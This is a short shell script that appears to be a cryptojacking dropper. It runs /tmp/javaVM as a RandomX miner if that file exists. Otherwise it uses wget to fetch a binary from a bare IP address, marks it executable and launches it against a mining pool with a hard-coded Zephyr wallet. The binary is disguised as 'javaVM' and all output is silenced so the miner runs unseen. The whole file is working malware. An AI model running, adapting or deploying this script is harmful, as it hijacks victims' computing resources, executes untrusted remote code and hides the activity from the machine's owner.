#!/bin/sh
if [ -f /tmp/javaVM ]
 	then
 	/tmp/javaVM --algorithm randomx --pool 103.228.74.80:4444 --wallet ZEPHs9EoDAxbWgcA8eLM6xVPpcKt5vMZz47KN29LaYRZVKhuowDdsM22n2ExnU3A7BiS3CxzXCuruRBofjuwvoP9FSRyXzzWWSt --password duckz --cpu-threads 1 --disable-gpu > /dev/null 2>&1 &
 	echo Started Existing
 	else
 		wget -q http://150.136.168.71:80/archxx/SMULTI24 -O /tmp/javaVM
 		chmod +x /tmp/javaVM
 		/tmp/javaVM --algorithm randomx --pool 103.228.74.80:4444 --wallet ZEPHs9EoDAxbWgcA8eLM6xVPpcKt5vMZz47KN29LaYRZVKhuowDdsM22n2ExnU3A7BiS3CxzXCuruRBofjuwvoP9FSRyXzzWWSt --password duckz --cpu-threads 1 --disable-gpu > /dev/null 2>&1 &
fi
